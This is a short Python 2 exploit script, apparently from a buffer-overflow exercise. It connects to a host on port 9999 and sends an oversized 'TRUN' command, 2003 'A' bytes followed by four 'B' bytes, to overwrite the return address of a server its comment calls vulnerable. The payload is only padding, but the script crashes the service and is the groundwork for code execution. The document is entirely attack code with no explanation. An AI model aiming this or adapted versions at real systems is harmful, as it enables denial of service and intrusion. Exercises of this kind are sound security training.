#!/usr/bin/python
import sys, socket

shellcode = "A" * 2003 + "B" * 4

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.1.213',9999))
		#previously determined trun was a vulnerable command
	s.send(('TRUN /.:/' + shellcode))
	s.close()

except:

	print "Error connecting to server"
	sys.exit()
